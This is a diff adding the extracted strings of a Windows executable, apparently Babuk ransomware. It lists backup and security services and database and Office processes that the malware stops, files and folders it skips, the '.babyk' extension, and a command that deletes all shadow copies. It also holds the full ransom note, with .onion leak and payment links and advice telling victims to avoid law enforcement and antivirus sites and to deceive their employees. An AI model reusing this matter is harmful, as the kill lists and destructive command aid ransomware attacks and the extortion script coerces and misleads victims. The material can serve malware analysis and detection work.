@@ -1,0 +1,292 @@
+!This program cannot be run in DOS mode.
+`.data
+.idata
+@.reloc
+memtas
+mepocs
+sophos
+backup
+GxCIMgr
+DefWatch
+ccEvtMgr
+ccSetMgr
+SavRoam
+RTVscan
+QBFCService
+QBIDPService
+Intuit.QuickBooks.FCS
+QBCFMonitorService
+YooBackup
+zhudongfangyu
+sophos
+stc_raw_agent
+VSNAPVSS
+VeeamTransportSvc
+VeeamDeploymentService
+VeeamNFSSvc
+PDVFSService
+BackupExecVSSProvider
+BackupExecAgentAccelerator
+BackupExecAgentBrowser
+BackupExecDiveciMediaService
+BackupExecJobEngine
+BackupExecManagementService
+BackupExecRPCService
+AcrSch2Svc
+AcronisAgent
+CASAD2DWebSvc
+CAARCUpdateSvc
+IsWow64Process
+kernel32.dll
+kernel32.dll
+Wow64DisableWow64FsRedirection
+kernel32.dll
+Wow64RevertWow64FsRedirection
+, Error Code: 
+Can't OpenProcess
+############## [ babuk ransomware greetings you ] ##############
+Introduction
+----------------------------------------------
+Congratulations! If you see this note, your company've been randomly chosen for security audit and your company haven't passed it.
+Unfortunately your servers are encrypted, backups are encrtypted too or deleted.
+Our enctyption algorythms are strong and it's impossible to decrypt your stuff without our help.
+Only one method to restore all your network and systems is - to buy our universal decryption software.
+Follow simple steps that discribed down below and your data will be saved.
+In case you ignore this situation, the consequences could me much serious, than you can imagine.
+Guarantees
+----------------------------------------------
+The hack and system encryption wasn't compromised by your competitors or any other 3rd party, this is just and only our initiative and only thing we interested is profit.
+Accurding the previous sentence We are very much value of our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests.
+All our decryption software is perfectly tested and will decrypt your data. We guarantee full support and help through the all decryption process.
+As the proof of our abilities and honesty, we can decrypt few small files for free, check the link provided and ask any questions.
+Data leakage
+----------------------------------------------
+We have copied some quantity of data from your servers.
+Check those proofs and estimate the seriousness of consequences which can occur in case you ignore us: http://wavbeudogz6byhnardd2lkp2jafims3j7tj6k6qnywchn2csngvtffqd.onion/blog/da83db34f2e0c077f7b064e6556f127c0a91d7ae21f3855f0e7279ce14d5f406/
+This link is private and only you can see it.
+Use tor browser to open link.
+Ignoring the interaction with us brings you the publishing your data in our public blog http://wavbeudogz6byhnardd2lkp2jafims3j7tj6k6qnywchn2csngvtffqd.onion/
+Contact
+----------------------------------------------
+1) Download tor browser: https://www.torproject.org/download/
+2) Open it
+3) Follow this link in tor browser: http://vq3zf757tzpwhs7bulnr43d2rfg5fkvvfkhee2zhhzievuxrbnarmgqd.onion/3fbf8f220dae00bb6bb8539b9c6c86c4bf5c58ccf651542e3363dd131239edd6
+* 6 simple steps do minimize harm from ransomware.
+-----------------------------------------------------------------------------------------------------------------
+Thousands of companies around the world are struggling on ransomware these days, and the most of companies are making the same mistakes again and again. Let
+s figure out how to minimize harm and do not be a dumb and pathetic donkey which will make fun for journalists and so on..
+1. If you see small fella malicious .exe file never load it to virustotal.com or any other virus researching website.
+Otherwise the info about the hack is not a secret anymore. The fact that your company is under ransomware attack is already known by filthy predators data security agents who will post in their pity twitters the fresh known news 
+OMG ANOTHER RANSOMWARE NOW IT
+Your company name LLC!!!!! We are all gonna die aaaaaa halp
+2. No any public announcements about the hack or data leakage. And do not applicate to law enforcement.
+If you commit this actions, more serious consequences can occur and you pay much more than a ransom amount. Law structures like GDPR in this case can oblige you to pay huge fine.
+3. As soon as you see your network compromised, follow the link inside any note and follow instructions.
+4. Calm your employees.
+Explain them that this is a drill. And you test your network security systems.
+5. If you decide to hire the data recovery company, obligate them to do not inform anyone and any third party about details of the attack.
+We strongly do not recommend to cooperate with data recovery company, because they do absolutely nothing that you can do by yourself and take money for it. all communications with hackers could be conducted by your it department indipendently without any extra payments.
+6. Do not try to decrypt your data via 3rd party software.
+Most of ransomware use strong encryption algorthm and you can harm your files by using 3rd party decryption software.
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+Can't RmGetList
+Can't RmRegisterResources
+Can't RmStartSession
+Can't open file after killHolder
+Can't MoveFileExW
+Can't FindFirstFileW
+Can't FindFirstFileW
+DoYouWantToHaveSexWithCuongDong
+DoYouWantToHaveSexWithCuongDong
+AQLwH'
+.rdata
+.rdata$zzzdbg
+.text$di
+.text$mn
+.idata$5
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.CRT$XCU
+FindFirstVolumeW
+FindNextVolumeW
+FindVolumeClose
+GetDriveTypeW
+GetVolumePathNamesForVolumeNameW
+CloseHandle
+GetLastError
+GetCurrentProcess
+TerminateProcess
+OpenProcess
+GetTickCount
+GetModuleHandleA
+GetProcAddress
+LoadLibraryA
+lstrcmpW
+lstrlenW
+SetVolumeMountPointW
+CreateToolhelp32Snapshot
+Process32FirstW
+Process32NextW
+CreateFileW
+WriteFile
+InitializeCriticalSection
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+lstrlenA
+GetCommandLineW
+FindClose
+FindFirstFileW
+FindNextFileW
+GetFileSizeEx
+GetLogicalDrives
+ReadFile
+SetFileAttributesW
+SetFilePointerEx
+WaitForSingleObject
+CreateMutexA
+WaitForMultipleObjects
+GetCurrentProcessId
+ExitProcess
+CreateThread
+ExitThread
+SetProcessShutdownParameters
+GetSystemInfo
+lstrcmpiW
+lstrcpyW
+lstrcatW
+OpenMutexA
+MoveFileExW
+WideCharToMultiByte
+HeapAlloc
+HeapFree
+GetProcessHeap
+ReleaseSemaphore
+CreateSemaphoreA
+KERNEL32.dll
+wsprintfA
+USER32.dll
+CryptAcquireContextW
+CloseServiceHandle
+ControlService
+EnumDependentServicesA
+OpenSCManagerA
+OpenServiceA
+QueryServiceStatusEx
+CryptReleaseContext
+CryptGenRandom
+ADVAPI32.dll
+ShellExecuteW
+CommandLineToArgvW
+SHEmptyRecycleBinA
+SHELL32.dll
+NetShareEnum
+NetApiBufferFree
+NETAPI32.dll
+RmStartSession
+RmEndSession
+RmRegisterResources
+RmGetList
+RstrtMgr.DLL
+WNetGetConnectionW
+WNetOpenEnumW
+WNetEnumResourceW
+WNetCloseEnum
+MPR.dll
+5!5(5/565=5D5K5R5Y5`5g5n5
+656F6k6
+7&707d7}7
+9,9B9X9p9
+:":,:R:|:
+==*=1=>=D=K=[=f=m=z=
+8 8D8k8
+> ?=?p?
+0"0/0N0c0u0
+1?1Q1^1}1
+2*2<2d2v2|2
+33%3/393G3L3V3g3
+4D4U4^4o4x4
+545F5n5
+5<6A6K6\6
+7/7A7i7{7
+:(:1:>:O:T:a:t:
+<,<K<X<y<
+<9=C=W=a=q=
+%0/0h0
+1"12191A1
+0;3N3p3
+:8:g=z=
+1/4B4d4
+$050D0J0P0
+0 0$0(0,0004080<0@0D0H0L0P0T0X0\0`0d0h0l0p0t0x0|0
+1 1$1(14181<1@1D1H1L1P1T1X1\1`1d1h1l1p1t1x1|1
+sql.exe
+oracle.exe
+ocssd.exe
+dbsnmp.exe
+synctime.exe
+agntsvc.exe
+isqlplussvc.exe
+xfssvccon.exe
+mydesktopservice.exe
+ocautoupds.exe
+encsvc.exe
+firefox.exe
+tbirdconfig.exe
+mydesktopqos.exe
+ocomm.exe
+dbeng50.exe
+sqbcoreservice.exe
+excel.exe
+infopath.exe
+msaccess.exe
+mspub.exe
+onenote.exe
+outlook.exe
+powerpnt.exe
+steam.exe
+thebat.exe
+thunderbird.exe
+visio.exe
+winword.exe
+wordpad.exe
+notepad.exe
+/c vssadmin.exe delete shadows /all /quiet
+cmd.exe
+AppData
+Windows
+Windows.old
+Tor Browser
+Internet Explorer
+Google
+Opera Software
+Mozilla
+Mozilla Firefox
+$Recycle.Bin
+ProgramData
+All Users
+autorun.inf
+boot.ini
+bootfont.bin
+bootsect.bak
+bootmgr
+bootmgr.efi
+bootmgfw.efi
+desktop.ini
+iconcache.db
+ntuser.dat
+ntuser.dat.log
+ntuser.ini
+thumbs.db
+Program Files
+Program Files (x86)
+#recycle
+.babyk
+\How To Restore Your Files.txt
+How To Restore Your Files.txt
+.babyk
+ADMIN$
+shares
+gbefore
